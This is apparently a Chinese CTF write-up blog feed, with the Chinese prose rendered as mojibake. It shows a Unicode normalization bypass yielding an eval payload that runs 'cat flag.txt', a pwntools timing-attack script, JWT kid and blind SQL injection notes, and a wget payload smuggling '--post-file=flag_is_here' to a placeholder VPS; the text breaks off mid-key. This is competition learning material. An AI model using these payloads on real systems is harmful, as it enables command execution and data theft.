&lt;p>åšé¢˜å¤šä¸€ç‚¹çš„å¸ˆå‚…åº”è¯¥å°±èƒ½æ˜Žç™½å•¥æ„æ€äº†ï¼Œä¸€ä¸ªå¸¸è€ƒçš„ç‚¹æ˜¯æ³¨å†Œ&lt;code>Âªdmin&lt;/code>çš„è´¦æˆ·æ¥ä¼ªé€ &lt;code>admin&lt;/code>ï¼Œè¿™é‡Œä¹Ÿæ˜¯åŒç†ï¼›ä»£ç ä¸­æœ‰ä¸€ä¸ªç¼ºé™·ï¼šå…ˆè¿‡æ»¤é»‘åå•å­—ç¬¦å†è¿›è¡Œ&lt;code>normalize()&lt;/code>ï¼Œè¿™ä¼šå¯¼è‡´ç‰¹æ®Šçš„unicodeå­—ç¬¦ä¼šå…ˆé¡ºåˆ©é€šè¿‡è¿‡æ»¤ï¼Œå†è¢«&lt;code>normalize()&lt;/code>è½¬ä¸ºæ­£å¸¸å­—ç¬¦ï¼Œæœ€ç»ˆå‘½ä»¤æ‰§è¡Œ&lt;/p>
&lt;p>è¿™é‡Œæ˜¯ä¸ªexp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#111">letters&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;Âª&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;áµ‡&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;á¶œ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;áµˆ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;áµ‰&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;á¶ &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;áµ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ê°&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;â±&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ê²&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;áµ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ë¡&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;áµ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;â¿&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Âº&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;áµ–&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;ï½‘&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ê³&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ë¢&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;â‚œ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;áµ˜&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;áµ›&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ê·&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ë£&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ê¸&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;á¶»&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#75715e"># payload = &amp;#34;print(__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;))&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;print(__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat flag.txt&amp;#39;))&amp;#34;&lt;/span>
&lt;span style="color:#111">exploit&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;áµ‰áµ›ÂªË¡(&amp;#39;&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">exploit&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;+á¶œÊ°Ê³(&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">)&amp;#34;&lt;/span>
&lt;span style="color:#111">exploit&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># áµ‰áµ›ÂªË¡(&amp;#39;&amp;#39;+á¶œÊ°Ê³(112)+á¶œÊ°Ê³(114)+á¶œÊ°Ê³(105)+á¶œÊ°Ê³(110)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(40)+á¶œÊ°Ê³(95)+á¶œÊ°Ê³(95)+á¶œÊ°Ê³(105)+á¶œÊ°Ê³(109)+á¶œÊ°Ê³(112)+á¶œÊ°Ê³(111)+á¶œÊ°Ê³(114)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(95)+á¶œÊ°Ê³(95)+á¶œÊ°Ê³(40)+á¶œÊ°Ê³(39)+á¶œÊ°Ê³(111)+á¶œÊ°Ê³(115)+á¶œÊ°Ê³(39)+á¶œÊ°Ê³(41)+á¶œÊ°Ê³(46)+á¶œÊ°Ê³(115)+á¶œÊ°Ê³(121)+á¶œÊ°Ê³(115)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(101)+á¶œÊ°Ê³(109)+á¶œÊ°Ê³(40)+á¶œÊ°Ê³(39)+á¶œÊ°Ê³(99)+á¶œÊ°Ê³(97)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(32)+á¶œÊ°Ê³(102)+á¶œÊ°Ê³(108)+á¶œÊ°Ê³(97)+á¶œÊ°Ê³(103)+á¶œÊ°Ê³(46)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(120)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(39)+á¶œÊ°Ê³(41)+á¶œÊ°Ê³(41))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ›´å¤šçš„ç›¸ä¼¼unicodeå¯ä»¥å‚è€ƒè¿™ä¸ªç½‘ç«™-&amp;gt;https://www.compart.com/en/unicode&lt;/p>
&lt;pre tabindex="0">&lt;code># è¿™æ ·çš„ä¹Ÿå¯ä»¥æ
ï½ï½’ï½‰ï½Žï½”(ï½ï½ï½…ï½Ž(ï½ƒï½ˆï½’(102) + ï½ƒï½ˆï½’(108) + ï½ƒï½ˆï½’(97) + ï½ƒï½ˆï½’(103) + ï½ƒï½ˆï½’(46) + ï½ƒï½ˆï½’(116) + ï½ƒï½ˆï½’(120) + ï½ƒï½ˆï½’(116)).ï½’ï½…ï½ï½„(115))
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">WAF Bypassing with Unicode Compatibility&lt;/a>&lt;/p>
&lt;hr>
&lt;p>&lt;del>å°‘äº†ä¸‰é“jsçš„é¢˜ï¼Œæˆ‘çš„ï¼Œä¸‹æ¬¡ä¸€å®šï¼&lt;/del>&lt;/p>
&lt;p>çŽ°åœ¨å°‘2é“äº†&lt;/p>
&lt;p>å¦å¤–steghide-as-a-serviceè¿™é“é¢˜æ„Ÿè°¢å¸ˆå‚…çš„å¸®åŠ©ï¼ˆæˆ‘è‡ªå·±å¡åˆ°ä¸€ä¸ªå¾ˆè ¢çš„åœ°æ–¹äº†&lt;/p>
&lt;p>æœ€è¿‘æœ‰ç‚¹æ‘†çƒ‚ï¼Œå±žäºŽæ˜¯æ˜¥å›°ç§‹ä¹é‡Œé¢çš„å†¬çœ äº†ï¼Œç¡ä¸é†’çš„å†¬ä¸‰æœˆå•Šå•Šå•Šå•Šå•Šå•Š&lt;/p>
&lt;p>åŒ—äº¬å†¬è‡³çš„æ—¶å€™æ—¥å‡ºæ—¥è½ä¹‹é—´åªæœ‰9ä¸ªåŠå°æ—¶ä¸åˆ°ï¼Œè°å¬äº†ä¸æƒ³ç¡æ­»è¿‡åŽ»ï¼ˆ&lt;/p></description></item><item><title>niteCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/12/12/nitectf2021-wp/</link><pubDate>Sun, 12 Dec 2021 23:12:52 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/12/nitectf2021-wp/</guid><description>&lt;p>&lt;a href="http://ctf.cryptonite.team/challenges">http://ctf.cryptonite.team/challenges&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://ctftime.org/event/1449">https://ctftime.org/event/1449&lt;/a>&lt;/p>
&lt;h2 id="webwelcome-to-nitectf">Web/welcome to niteCTF&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>welcome&lt;/strong> &lt;strong>baby&lt;/strong>&lt;/p>
&lt;p>Go to the &lt;a href="https://capturetheflag.cryptonite.team/">https://capturetheflag.cryptonite.team&lt;/a> and copy the flag, it&amp;rsquo;s that simple!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205533558.png" alt="image-20211212205533558">&lt;/p>
&lt;p>f12ç»™æ•´äº†ä¸ªb64ï¼Œè§£ç ä¹‹åŽæ˜¯Cryptoniteï¼Œå¾ˆé—æ†¾å®ƒå¹¶ä¸æ˜¯flag&lt;/p>
&lt;p>æŠ“åŒ…åŽçœ‹åˆ°æœ‰jsfuck&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205758869.png" alt="image-20211212205758869">&lt;/p>
&lt;p>&amp;lsquo;Organized by Cryptonite Manipal&amp;rsquo;&lt;/p>
&lt;p>ä¹Ÿä¸æ˜¯flagï¼Œå°±å¾ˆé¸¡è´¼ï¼Œåœ¨å¦ä¸€ä¸ªjsæ–‡ä»¶ä¸­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212210259142.png" alt="image-20211212210259142">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212210245571.png" alt="image-20211212210245571">&lt;/p>
&lt;h2 id="webbatchest">Web/BATCHEST&lt;/h2>
&lt;blockquote>
&lt;p>My friend just opened a new zoo, so I made him a site to check if his zoo has those animals. &lt;a href="https://blindsqli-web.chall.cryptonite.team/">https://blindsqli-web.chall.cryptonite.team/&lt;/a>&lt;/p>
&lt;p>Author: SPEED&lt;/p>
&lt;/blockquote>
&lt;p>æŠŠç›²æ³¨çš„æç¤ºå†™åˆ°urlä¸­äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212213444605.png" alt="image-20211212213444605">&lt;/p>
&lt;p>å®ƒçš„å›žæ˜¾åªæœ‰æœ‰å’Œæ²¡æœ‰ä¸¤ç§ï¼Œæ‰€ä»¥éœ€è¦char-by-charç±»åž‹çš„ç›²æ³¨&lt;/p>
&lt;p>ä¸è¿‡è¿™é‡Œè¦æ³¨æ„&lt;code>lion'or '1' #&lt;/code>è¿”å›žäº†500ï¼Œè€Œ&lt;code>lion'or '1' -- &lt;/code>è¿”å›žæ­£å¸¸ï¼Œè¯´æ˜Žè¿™é‡Œçš„æ•°æ®åº“æ˜¯sqliteï¼Œç”¨çš„æ˜¯&lt;code>sqlite_master&lt;/code>æ¥èŽ·å–ä¿¡æ¯&lt;/p>
&lt;pre tabindex="0">&lt;code># è„šæœ¬æˆ‘ä¹‹åŽå®Œå–„ä¸€ä¸‹
# ä¹‹å‰å†™äº†ä¸€ä¸ªé€šç”¨çš„char-by-char-sqliçš„æ¨¡æ¿
# ä½†æ˜¯å‘çŽ°è€¦åˆæ€§å¤ªé«˜äº†
# è¿˜æ˜¯æŒ‰åŠŸèƒ½åˆ†å¼€å‡½æ•°å†™æ¯”è¾ƒå¥½
# å¾…å®Œå–„ä¸­XD
# ç„¶åŽçœ‹åˆ°äº†ä¸€ä¸ªæˆªå›¾
# å¯¹å“¦ ä»–å¦ˆçš„ä¸ºä»€ä¹ˆç›²æ³¨è¿™ç§ä¸œè¥¿ä¸ç›´æŽ¥ç”¨burp-intruderå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ
# ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ
# çªç„¶å‘çŽ°äº†ä¸€ä¸ªåŽç‚¹
# è¿˜å†™ä¸ªpçš„è„šæœ¬ ç”¨burp
# å¼€çŽ©ç¬‘çš„ å„æœ‰å„çš„åº”ç”¨åœºæ™¯
&lt;/code>&lt;/pre>&lt;h2 id="webjwt">Web/JWT&lt;/h2>
&lt;blockquote>
&lt;p>Jason likes cookies but he is diabetic. So his mom stored them away somewhere safe. Can you help him find the path that leads to the solution for his hungry desires?&lt;/p>
&lt;p>&lt;a href="https://jwt-web.challenge.cryptonite.team/">https://jwt-web.challenge.cryptonite.team&lt;/a> http://35.201.116.81/&lt;/p>
&lt;p>Author: LatinArceus&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011510158.png" alt="image-20211212011510158">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011548007.png" alt="image-20211212011548007">&lt;/p>
&lt;p>æˆ‘ä»¬å¾—ä¼ªé€ ä¸€ä¸ª&lt;code>&amp;quot;admin_cap&amp;quot;:&amp;quot;true&amp;quot;&lt;/code>çš„cookieï¼Œæ³¨æ„åˆ°è¿™é‡Œçš„&lt;code>kid&lt;/code>æŒ‡å‘çš„æ˜¯æœåŠ¡å™¨æœ¬åœ°çš„secret.txtï¼Œé‚£æˆ‘ä»¬åªéœ€è¦æŠŠå®ƒæŒ‡å‘æˆ‘ä»¬è‡ªå·±çš„secret.txtå°±å¥½äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205136265.png" alt="image-20211212205136265">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205200492.png" alt="image-20211212205200492">&lt;/p>
&lt;p>&lt;code>nite{R3diR3ct10n_c4n_b3_4_vuLn_t0O}&lt;/code>&lt;/p>
&lt;h2 id="misclets-be-artistic">Misc/Let&amp;rsquo;s be Artistic&lt;/h2>
&lt;blockquote>
&lt;p>We have received some encoded message from an art gallery. Can you trace it back to the flag? The flag is all uppercase. Wrap it in flag format nite{}&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>87yhnmkj 5rfvbnju76 5rfvbnju76 tyjnbg tyjnbg 5rfc6ygn cft6yhn efvgyjmko 9ikm xdr5thnji9 87yhnmkj
&lt;/code>&lt;/pre>&lt;p>é”®ç›˜æ‰“å­—çš„è½¨è¿¹ &lt;del>ï¼ˆåœ¨é”®ç›˜ä¸Šæ’’æŠŠç±³ é¸¡è·‘çš„è·¯çº¿&lt;/del>&lt;/p>
&lt;p>&lt;code>nite{GOODDRAWING}&lt;/code>&lt;/p>
&lt;h2 id="miscslow-passwords">Misc/Slow Passwords&lt;/h2>
&lt;blockquote>
&lt;p>We made ourselves super secure by a random password authentication every time the connection is established. Is it really that secure?&lt;/p>
&lt;p>&lt;code>nc slow-passwords.challenge.cryptonite.team 1337&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>åˆšå¼€å§‹éƒ½æ²¡æ˜Žç™½å•¥æ„æ€ï¼Œçœ‹äº†wpçŸ¥é“äº†&lt;/p>
&lt;p>æ¯æ¬¡è¿žæŽ¥æœåŠ¡å™¨ç”Ÿæˆä¸åŒçš„passwdï¼Œå…è®¸æ¯æ¬¡1ä¸ªå­—ç¬¦è¾“3æ¬¡ï¼Œä½†æ˜¯è¾“å…¥ä¸åŒå­—ç¬¦çš„å“åº”æ—¶é—´æ˜¯ä¸åŒçš„ï¼Œæœ‰çš„é•¿æœ‰çš„çŸ­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾ä¸ªå‚ç…§å­—ç¬¦ï¼ˆæ¯”å¦‚&lt;code>'a'&lt;/code>ï¼‰ï¼Œé€šè¿‡å“åº”æ—¶é—´è·Ÿ&lt;code>'a'&lt;/code>æ‰€èŠ±çš„æ—¶é—´çš„åç§»é‡æ¥åˆ¤æ–­æ˜¯å¦æ­£ç¡®ï¼ˆç›¸å½“äºŽä¸€ç§å˜ç›¸çš„æ—¶é—´ç›²æ³¨äº†ï¼‰ï¼Œä»Žè€Œè®¡ç®—å‡ºä¸‹ä¸€ä¸ªè¯¥è¾“å…¥çš„å­—ç¬¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">time&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">remote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;slow-passwords.challenge.cryptonite.team&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvlines&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">curr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;start:&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">curr&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">curr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>
&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sendline&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">start&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">time&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">end&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">time&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">offset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">round&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">end&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;offset:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">offset&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">next&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">offset&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sendline&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">next&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212213101123.png" alt="image-20211212213101123">&lt;/p>
&lt;p>å¾ˆå·§å¦™çš„ç”¨æ³•ï¼è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬char-by-charç±»åž‹çš„ç›²æ³¨çœŸçš„æ˜¯åœ¨ä»¥å„ç§å„æ ·çš„å½¢å¼å››å¤„å¼€èŠ±ï¼Œåœ¨å¾ˆå¤šåœºåˆéƒ½èƒ½ç”¨çš„ä¸Š&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/jontay999/CTF-writeups/tree/master/niteCTF/Misc/slow_passwords">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>æœ€è¿‘åˆ·é¢˜åˆ°buuojç¬¬7é¡µäº†ï¼Œå­¦æ ¡ä¹Ÿåˆ°ç¬¬15å‘¨çš„æ•™å­¦å‘¨äº†ï¼Œè¿™å‘¨è¿˜æœ‰å››çº§ï¼Œæ•´ä¸ªäººï¼Œæœ‰ç‚¹éš¾é¡¶çš„&lt;/p>
&lt;p>æ‰€ä»¥ï¼æˆ‘é€‰æ‹©å½“ä¸€åªé¸µé¸Ÿï¼Œæœ¬ç€ï¼šè½¦åˆ°å±±å‰å¿…æœ‰è·¯ï¼Œèˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´çš„æ€åº¦è¿Žæ¥å¯’å‡å‰è¿™æ®µæ—¶é—´ï¼&lt;/p>
&lt;p>å¤ªå¤šçš„flagå°±ä¸ç«‹äº†ï¼Œç«‹å¿ƒé‡Œäº†&lt;/p></description></item><item><title>æ·±è‚²æ¯2021 Wp</title><link>https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/</link><pubDate>Wed, 17 Nov 2021 19:11:38 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/</guid><description>&lt;h2 id="fakewget">FakeWget&lt;/h2>
&lt;blockquote>
&lt;p>åˆ©ç”¨shä¸‹grepå‘½ä»¤æ­£åˆ™ç¼ºé™·ç»•è¿‡æ­£åˆ™æ£€æŸ¥&lt;/p>
&lt;/blockquote>
&lt;p>è¿™ä¸ªé¢˜ï¼Œå°±éžå¸¸çš„å¯æƒœï¼Œå…·ä½“çš„å°±ä¸è¯´äº†ï¼Œå¤ªä¸¢äººäº†ï¼Œæ€»ä¹‹ååˆ†æ‹‰è·¨ï¼Œç‰¹åˆ«å¯æƒœï¼Œç©¶æžä¸‹é¥­ã€‚&lt;/p>
&lt;p>æ‰«ç›®å½•ï¼Œå¾—åˆ°/consoleï¼Œ/wgetï¼Œ/flagé¡µé¢å¾—åˆ°æç¤ºflagåœ¨/flag_is_here&lt;/p>
&lt;p>/wgetå¯ä»¥å‘é€urlè¿›è¡Œwgetçš„æ“ä½œï¼Œè·Ÿcurlä¸€æ ·ï¼Œä¹Ÿæ˜¯å¯ä»¥å‘é€postè¯·æ±‚æ»´ï¼Œè¿™é‡Œå¯¹è¾“å…¥çš„urlæœ‰æ£€æµ‹ï¼Œä¸å…è®¸æœ‰ç©ºæ ¼å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦&lt;/p>
&lt;p>è¿™é‡Œå…¶å®žæœ‰ä¸ªåŽŸé¢˜&lt;a href="https://www.gem-love.com/ctf/2745.html">[çºµæ¨ªæ¯ 2020]magic_download&lt;/a>ï¼Œå‡ ä¹Žæ˜¯ä¸€æ ·çš„ï¼Œshåœ¨grepæ—¶å¯ä»¥ç”¨æ¢è¡Œçš„æ“ä½œæ¥ç»•è¿‡&lt;/p>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">senduri&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">uri&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://your_vps_ip:port/\\n?\t--post-file=flag_is_here&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">JSEncrypt&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">publicKey&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;-----BEGIN PUBLIC KEY-----\
&lt;/span>&lt;span style="color:#d88200">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoFH2atPqJOH6yezxEw9s\
&lt;/span>&lt;span style="color:#d88200">eStp0j7hN3cKKlANZpAv8RRhpDxFcob47OwkyUlsJp6tdvSJBtsJ5KCNYIomdqc7\
